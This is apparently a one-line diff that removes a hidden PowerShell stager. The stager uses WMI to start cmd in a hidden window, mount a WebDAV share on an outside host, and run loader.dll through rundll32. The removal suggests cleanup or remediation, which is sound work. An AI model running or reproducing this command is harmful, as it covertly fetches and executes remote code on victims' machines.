@@ -1,1 +1,0 @@
-$si=([wmiclass]'Win32_ProcessStartup').CreateInstance();$si.ShowWindow=0;([wmiclass]'Win32_Process').Create('cmd /c pushd \\berserk-test.mom@SSL\2e8bace5-6217-48d5-9ef0-ea7d09513d32 & rundll32 loader.dll,#1',$null,$si)
